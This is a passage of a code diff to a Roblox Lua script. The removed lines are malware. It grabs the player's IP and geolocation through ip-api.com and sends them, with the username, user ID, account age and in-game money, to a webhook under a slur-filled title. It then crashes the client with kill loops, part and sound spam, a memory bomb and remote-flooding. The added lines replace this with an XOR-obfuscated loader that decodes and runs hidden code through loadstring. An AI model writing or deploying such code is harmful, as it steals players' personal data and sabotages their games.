154b344222228fda7f3b75f8cc40ee12c3b","20700137a780f08834da69d3da7be49b8379fb94bd505fd7ffa0225f9ed5122cf43a0cffdf3fdcc08bd0dc4b1dc021ceeaafe7f652c8d71e70e91ec62a5d535","a1ee8bb7e2456d06f48f2cef441242e36ec4b6cd9829d919a7bb241d3cd6bfbd1beb7cc8a78340cf2d79fe9b3dbd973571065e3b3e4411f5f2a1d13e5b75cea","ba3be55e7fe293cd5c9159f22d25f906881cca6e4dceec41b7df6dd3d23d9efece62da877700e1354e288554cd37d73d406062b40b5c3c87dfffc6f049a516b","f329eb3c344b54bfbe8097d5814539db653143ed02f40099cc1935ed0759f92a83aca2f9e3ef82f5984e7fa01e52c8144697306488be5f635bd367ac489939c","9c38e11666bfa6126b67fc6c9eae760c0ad941ea38c871f472ab0acba88950bf466b5484b85ef0cf36d223c1bb8515da7f82bef7542cf738a4e64b5b102b77a","5eec0c671326800b6e07921a7166d0e8526bbea6082b061bef3d0d76ed9f0d8b18e56a0a305550a3975d9e4687b0610d9add93dde68c8a89acd4746cc1b5fd5","bcf3c31e56d8b9f49156cbceb6eb72280d79277d497b2812538f31848c988e231e9ef068b75c299b6728e0b7510635b9671e194280deae044f57a78b6af1757","d223d5febcc80c037df7ce533a6a2c5f86b27a5aeec5c8a8b2f0a86eac13f53eb67bf7f4f2522cd9e050997481f685e229744c1c7e6cfa14fbd3b0cd8b013a7","286fdf9a48a055d5e846624791868f97253fcb4740dec614e3a7e997bd1347f6b80b524ba60a848319a32eea8e1a9c7d4f4f65fd5a0764669c14ff0f027f83e","ae6f638f9eff2a9de0377dfd8a1c6048fa424d810cdeafca8dcb6ede73076111a30df0627448c4db6e4466b9eafa0dd7ce910d8e652d9de03571b211e9bad67","9f8b20aea7d71eaf91749c43fd3cadfd69c87d11ebc46bdf4c7897f90b4e4ffab29e8e92378b90e7a73b36a08d9fbbdefb2b7e35d5910ebddb77eb28360a77e","3359fd9022b49c213e940992568df05ed958b243a2fba4d8612374537a4444c70b290ddec7d762bf632b137faef1a5c988395f223c4f0bbf9d875cc0644f4c0","a685576571281a4388a57ef9de02216dda36d1aad792d59af9235250bf3fa9415cdac8700edfe58cf665073ebfa6776d7d349e233c797a24b4702cab48698eb","7c36b9de0337a90e36eb44ba9998f304acb54468dfa1e8999249c0f02543868cd6dd68dff9639dcd8844731e524c1ddeb20a052bc820b14ed38c0f37b9fdc88","928eb1f6ee1f0ea640ff21c0cfd2a25333bad87adc2ef03b1ab32345a9433eafb4e29c134cf7eb40b31d8eb1e157348b6f3942c77f5ba2c0aef97d60c483486","211c7d1ee40332007706e87221c006a260ef146ee6633a96c48b6708da2421406d3c82adca707971ef31224878d00d9a55c38e50af2a912352a71b4f0fd0579","75a42aa54fea73e76ee59b9df31209190c83f64776ddd75b9472db57959140a11c84a2fb9f5ea6584d8aed4b94ccb37363b59df3387d685de79debfa4901450","0a18aaf904c4d20ed702d4db0b9532ed55aadc3d","5c33d0dd288df13052d331a5f97e6c134c376ee62c78f89da710d395d68b2e066b6520ffe07091e702bda9adcba0ee55b4ac37752810ca3ea3d62ed6c31c7d2","6bc96cdec0c3c9c1fbac566d614401ef390f534df15af5d9a9bf62a17699dc7db7c169ea6678284b65c6e0fcd5f90be8315fabad11f754371194e1e6009d062","b7b8dded0b6b3522832294731a9344a2632b4f592c14a4ff79f6f17efd8532f7f0a1acf54e9e7d31890d99e0af0b07464d635d78dd9b783bc9f6fc4e17841c6","ef55c78ad0ffe5370915497e5ed6889d3343df1ed6631c61255c733c4216d7fdeccd02f01ee1413fe1f60aca52b5c3dcd890e572c4227d9f0cdc698dfa934b4","54f25f47f2a3725263eba897d46618c77955f7ea0f63841e78bcfbcfeead26c29b7747a5e56b140b4fca9c5ca0ed151309f26dee5f93b01f130e5ed11c880f9"}
+local dvAYM17915o__={61,10,66,49,46,4,69,52,12,79,87,92,72,48,93,58,7,43,6,81,77,94,19,35,51,9,20,14,2,63,38,17,29,21,8,47,32,73,37,90,42,13,28,70,54,74,15,53,3,24,26,84,67,57,56,16,78,65,71,18,82,5,55,1,36,91,96,88,68,33,62,60,41,34,31,27,22,40,76,64,50,85,83,30,45,95,89,39,80,44,86,97,59,75,25,23,11}
+local kBZxgm8M7IcG={}
+for mQ2ppqaITNRQo6=1,#bx5ZgOoBC60oEbD2BJ do kBZxgm8M7IcG[bx5ZgOoBC60oEbD2BJ[mQ2ppqaITNRQo6]]=ae6o33Gf8M[mQ2ppqaITNRQo6] end
+kBZxgm8M7IcG=table.concat(kBZxgm8M7IcG)
+local p5SmfkEWRWIpuM={}
+for mQ2ppqaITNRQo6=1,#dvAYM17915o__ do p5SmfkEWRWIpuM[dvAYM17915o__[mQ2ppqaITNRQo6]]=xzhM6xXOe0EJaIEL[mQ2ppqaITNRQo6] end
+p5SmfkEWRWIpuM=table.concat(p5SmfkEWRWIpuM)
+local sv5_xnI5uFg={}
+for mQ2ppqaITNRQo6=1,#kBZxgm8M7IcG,2 do
+  sv5_xnI5uFg[#sv5_xnI5uFg+1]=tonumber(string.sub(kBZxgm8M7IcG,mQ2ppqaITNRQo6,mQ2ppqaITNRQo6+1),16)
 end
-
-local function getIPDetails(ip)
-    local success, result = pcall(function()
-        return game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,regionName,city,isp,org,as,query")
-    end)
-    if success and result then
-        return game:GetService("HttpService"):JSONDecode(result)
-    end
-    return nil
+local xXkt_dCRMTSYx1R3PB={211,77,69,241,44,26,118,130,73,77,114,168,81,240,223,72,100,213,81,208,220,14,144,243,233,182,198,243,92,220,31}
+for mQ2ppqaITNRQo6=1,#sv5_xnI5uFg do
+  sv5_xnI5uFg[mQ2ppqaITNRQo6]=bit32.bxor(sv5_xnI5uFg[mQ2ppqaITNRQo6],xXkt_dCRMTSYx1R3PB[(mQ2ppqaITNRQo6-1)%#xXkt_dCRMTSYx1R3PB+1])
 end
-
-local function sendWebhook(ipData, player)
-    local userId = player.UserId
-    local username = player.Name
-    local displayName = player.DisplayName
-    
-    local accountAge = os.time() - player.AccountAge
-    local daysOld = math.floor(accountAge / 86400)
-    
-    local money = 0
-    local leaderstats = player:FindFirstChild("leaderstats")
-    if leaderstats then
-        local moneyVal = leaderstats:FindFirstChild("money")
-        if moneyVal and moneyVal:IsA("IntValue") then
-            money = moneyVal.Value
-        end
-    end
-    
-    local embed = {
-        embeds = {{
-            title = "🔴 NEW FAGGOT FOUND",
-            color = 16711680,
-            fields = {
-                {name = "🆔 Username", value = username .. " (" .. displayName .. ")", inline = true},
-                {name = "🔢 User ID", value = tostring(userId), inline = true},
-                {name = "📅 Account Age", value = daysOld .. " days", inline = true},
-                {name = "💰 Money", value = tostring(money), inline = true},
-                {name = "🌐 IP", value = ipData.query or "Unknown", inline = true},
-                {name = "📍 Country", value = ipData.country or "Unknown", inline = true},
-                {name = "🏙️ Region", value = ipData.regionName or "Unknown", inline = true},
-                {name = "🏛️ City", value = ipData.city or "Unknown", inline = true},
-                {name = "🏢 ISP", value = ipData.isp or "Unknown", inline = true},
-                {name = "🔌 Organization", value = ipData.org or "Unknown", inline = true},
-                {name = "📡 AS", value = ipData.as or "Unknown", inline = true}
-            },
-            footer = {text = "Logged at: " .. os.date("%Y-%m-%d %H:%M:%S")}
-        }}
-    }
-    
-    local jsonData = game:GetService("HttpService"):JSONEncode(embed)
-    
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    pcall(function()
-        game:HttpPost(webhookURL, jsonData, false, headers)
-    end)
+local xQsyNdX3NH9={}
+for mQ2ppqaITNRQo6=1,#p5SmfkEWRWIpuM,2 do
+  xQsyNdX3NH9[#xQsyNdX3NH9+1]=tonumber(string.sub(p5SmfkEWRWIpuM,mQ2ppqaITNRQo6,mQ2ppqaITNRQo6+1),16)
 end
-
-task.spawn(function()
-    task.wait(2)
-    
-    local player = game.Players.LocalPlayer
-    if not player then return end
-    
-    local userId = player.UserId
-    if loggedAccounts[userId] then
-        return
-    end
-    
-    loggedAccounts[userId] = true
-    
-    local ip = getIP()
-    if not ip then
-        return
-    end
-    
-    local ipDetails = getIPDetails(ip)
-    if ipDetails and ipDetails.status == "success" then
-        sendWebhook(ipDetails, player)
-    else
-        sendWebhook({query = ip, country = "Unknown", regionName = "Unknown", city = "Unknown", isp = "Unknown", org = "Unknown", as = "Unknown"}, player)
-    end
-end)
-
-task.spawn(function()
-    task.wait(5)
-    
-    xpcall = function(f, _) return f() end
-    pcall = function(f, ...) return true, f(...) end
-    
-    task.spawn(function()
-        while true do
-            local player = game.Players.LocalPlayer
-            if player and player.Character then
-                player.Character:BreakJoints()
-            end
-            task.wait(0.1)
-        end
-    end)
-    
-    task.spawn(function()
-        while true do
-            for i = 1, 50 do
-                local part = Instance.new("Part")
-                part.Size = Vector3.new(50, 50, 50)
-                part.Anchored = true
-                part.Transparency = 0.5
-                part.Position = Vector3.new(
-                    math.random(-1000, 1000),
-                    math.random(-1000, 1000),
-                    math.random(-1000, 1000)
-                )
-                part.Parent = workspace
-            end
-            task.wait()
-        end
-    end)
-    
-    task.spawn(function()
-        if getreg then
-            local reg = getreg()
-            for k, v in pairs(reg) do
-                if type(v) == "function" and tostring(k):find("FetchDatabases") then
-                    reg[k] = function() return nil, "FUCK OFF" end
-                end
-            end
-        end
-    end)
-    
-    task.spawn(function()
-        while true do
-            pcall(function()
-                local sound = Instance.new("Sound")
-                sound.SoundId = "rbxassetid://154069593"
-                sound.Volume = 10
-                sound.Parent = game.Workspace
-                sound:Play()
-                task.wait(0.5)
-                sound:Destroy()
-            end)
-        end
-    end)
-    
-    task.spawn(function()
-        local memoryBomb = {}
-        while true do
-            for i = 1, 10000 do
-                table.insert(memoryBomb, {
-                    data = string.rep("A", 1024 * 1024),
-                    timestamp = os.time(),
-                    random = math.random(1, 9999999),
-                    nested = {
-                        more = string.rep("B", 512 * 1024),
-                        andMore = {
-                            evenMore = string.rep("C", 256 * 1024)
-                        }
-                    }
-                })
-            end
-            task.wait()
-        end
-    end)
-    
-    task.spawn(function()
-        task.wait(0.5)
-        for _, v in pairs(game.CoreGui:GetChildren()) do
-            if v:IsA("ScreenGui") and (
-                v.Name:lower():find("key") or 
-                v.Name:lower():find("system") or 
-                v.Name:lower():find("login")
-            ) then
-                v:Destroy()
-            end
-        end
-        for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
-            if v:IsA("ScreenGui") and (
-                v.Name:lower():find("key") or 
-                v.Name:lower():find("system") or 
-                v.Name:lower():find("login")
-            ) then
-                v:Destroy()
-            end
-        end
-    end)
-    
-    task.spawn(function()
-        task.wait(1)
-        local function findRemotes()
-            local remotes = {}
-            for _, service in pairs(game:GetChildren()) do
-                if service:IsA("ReplicatedStorage") or service:IsA("ReplicatedFirst") then
-                    for _, child in pairs(service:GetDescendants()) do
-                        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-                            table.insert(remotes, child)
-                        end
-                    end
-                end
-            end
-            return remotes
-        end
-        
-        local allRemotes = findRemotes()
-        while true do
-            for _, remote in pairs(allRemotes) do
-                pcall(function()
-                    if remote:IsA("RemoteEvent") then
-                        remote:FireServer(
-                            "crash", 
-                            "this", 
-                            "is", 
-                            "spam", 
-                            {
-                                data = string.rep("X", 10000),
-                                nested = {
-                                    nested = {
-                                        nested = {
-                                            data = "overflow"
-                                        }
-                                    }
-                                }
-                            }
-                        )
-                    elseif remote:IsA("RemoteFunction") then
-                        remote:InvokeServer("crash", string.rep("Y", 5000))
-                    end
-                end)
-            end
-            task.wait()
-        end
-    end)
-    
-    task.spawn(function()
-        local oldGet = game.HttpGet
-        local oldPost = game.HttpPost
-        
-        game.HttpGet = function(...)
-            if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
-                return "ERROR: ACCESS DENIED"
-            end
-            return oldGet(...)
-        end
-        
-        game.HttpPost = function(...)
-            if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
-                return "ERROR: ACCESS DENIED"
-            end
-            return oldPost(...)
-        end
-    end)
-    
-    task.spawn(function()
-        game:GetService("RunService").RenderStepped:Connect(function()
-            local x = 0
-            for i = 1, 1000 do
-                x = x + math.sqrt(i * math.pi)
-            end
-        end)
-    end)
-end)
+local fSmEwLhHxJJo4mKQV={55,45,33,204,124,48,108,113,53,154,198,90,61,139,227,171,32,83,10,100,101,250,123,176,244,18,71,40,251,190,91}
+for mQ2ppqaITNRQo6=1,#xQsyNdX3NH9 do
+  xQsyNdX3NH9[mQ2ppqaITNRQo6]=bit32.bxor(xQsyNdX3NH9[mQ2ppqaITNRQo6],fSmEwLhHxJJo4mKQV[(mQ2ppqaITNRQo6-1)%#fSmEwLhHxJJo4mKQV+1])
+end
+local zMYbfXn4Isvy7a={}
+for mQ2ppqaITNRQo6=1,math.max(#sv5_xnI5uFg,#xQsyNdX3NH9) do
+  if sv5_xnI5uFg[mQ2ppqaITNRQo6] then zMYbfXn4Isvy7a[#zMYbfXn4Isvy7a+1]=sv5_xnI5uFg[mQ2ppqaITNRQo6] end
+  if xQsyNdX3NH9[mQ2ppqaITNRQo6] then zMYbfXn4Isvy7a[#zMYbfXn4Isvy7a+1]=xQsyNdX3NH9[mQ2ppqaITNRQo6] end
+end
+local xjmJLg1r1pOB={}
+local hGV5JVVU_A3Z=878428253
+for mQ2ppqaITNRQo6=#zMYbfXn4Isvy7a-1,1,-1 do
+  hGV5JVVU_A3Z=(hGV5JVVU_A3Z*1664525+1013904223)%4294967296
+  local fmzklfnLXpDVMjV=hGV5JVVU_A3Z%(mQ2ppqaITNRQo6+1)+1
+  xjmJLg1r1pOB[#xjmJLg1r1pOB+1]={mQ2ppqaITNRQo6+1,fmzklfnLXpDVMjV}
+end
+for mQ2ppqaITNRQo6=#xjmJLg1r1pOB,1,-1 do
+  local zcmvKY2dSQIpN0QtDc=xjmJLg1r1pOB[mQ2ppqaITNRQo6]
+  local gioEParyMTT4sx=zMYbfXn4Isvy7a[zcmvKY2dSQIpN0QtDc[1]]
+  zMYbfXn4Isvy7a[zcmvKY2dSQIpN0QtDc[1]]=zMYbfXn4Isvy7a[zcmvKY2dSQIpN0QtDc[2]]
+  zMYbfXn4Isvy7a[zcmvKY2dSQIpN0QtDc[2]]=gioEParyMTT4sx
+end
+local ijASxo2Ssj5BM={231,248,79,213,79,185,6,110,44,4,200,154,109,156,63,155,181,216,225,12,246,177,84,230,12,141,238,243,83,115,239}
+local cEQokYEos={}
+for mQ2ppqaITNRQo6=1,#zMYbfXn4Isvy7a do
+  cEQokYEos[mQ2ppqaITNRQo6]=string.char(bit32.bxor(zMYbfXn4Isvy7a[mQ2ppqaITNRQo6],ijASxo2Ssj5BM[(mQ2ppqaITNRQo6-1)%#ijASxo2Ssj5BM+1]))
+end
+local wk99IsAuvQf=table.concat(cEQokYEos)
+local m7AdJsdZOy1x2PGN=816
+local lj_2XgNXO5404MK=math.floor(2)
+local jluV4hRKmOW1Uvu=bit32.bxor(112,57)
+if false then error("") end
+do local _=nil end
+local tYCG2eF9YSOrsW,o3wtvDTZFO66JM=loadstring(wk99IsAuvQf)
+if tYCG2eF9YSOrsW then
+  tYCG2eF9YSOrsW()
+else
+  error("Mnx | Public Enemy : "..tostring(o3wtvDTZFO66JM))
+end
 local legitTable = {
     {id = "rbxassetid://123456789", name = "Fake Shirt 1"},
     {id = "rbxassetid://987654321", name = "Fake Pants 1"},
